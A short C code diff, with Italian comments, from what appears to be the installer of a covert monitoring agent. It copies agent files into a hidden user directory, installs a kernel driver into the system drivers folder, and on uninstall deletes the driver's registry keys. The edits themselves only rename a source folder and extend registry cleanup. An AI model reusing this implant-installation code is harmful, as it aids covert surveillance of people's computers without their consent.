@@ -16,7 +16,7 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 		return FALSE;
 
 	// Copia i file 
-	swprintf_s(tmp_path, MAX_PATH, L"%s\\WIN32\\*.*", rcs_info->rcs_files_path);
+	swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\*.*", rcs_info->rcs_files_path);
 	hFind = FindFirstFile(tmp_path, &file_info);
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
@@ -24,7 +24,7 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 				continue;
 
-			swprintf_s(tmp_path, MAX_PATH, L"%s\\WIN32\\%s", rcs_info->rcs_files_path, file_info.cFileName);
+			swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\%s", rcs_info->rcs_files_path, file_info.cFileName);
 			swprintf_s(tmp_path2, MAX_PATH, L"%s%s\\%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->hdir, file_info.cFileName);
 			ClearAttributes(tmp_path2);
 			if (!CopyFile(tmp_path, tmp_path2, FALSE)) {
@@ -138,9 +138,9 @@ BOOL WIN_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struc
 		return TRUE; // Non fa comparire il messaggio di errore
 
 	if (os_info->arch == 32)
-		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"%s\\WIN32\\%s", rcs_info->rcs_files_path, rcs_info->hdrv);
+		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"%s\\WINDOWS\\%s", rcs_info->rcs_files_path, rcs_info->hdrv);
 	else
-		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"%s\\WIN32\\%s", rcs_info->rcs_files_path, rcs_info->hdrv64);
+		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"%s\\WINDOWS\\%s", rcs_info->rcs_files_path, rcs_info->hdrv64);
 
 	swprintf_s(dest_drv, sizeof(dest_drv)/sizeof(dest_drv[0]), L"%s%s\\drivers\\%s", os_info->drive, os_info->system_root, rcs_info->hsys);
 
@@ -230,10 +230,13 @@ BOOL WIN_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_str
 			continue;
 		}
 
-		// Cancella la chiave
+		// Cancella le chiavi
 		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"RCS_SYSTEM\\%s\\Services\\%s", subkey, rcs_info->hsys);
+		RegDeleteTree(HKEY_LOCAL_MACHINE, src_drv);
+		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"RCS_SYSTEM\\%s\\Enum\\Root\\LEGACY_%s", subkey, rcs_info->hsys);
+		RegDeleteTree(HKEY_LOCAL_MACHINE, src_drv);
+
 		SAFE_FREE(subkey);
-		RegDeleteKey(HKEY_LOCAL_MACHINE, src_drv);
 	}
 
 	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\");
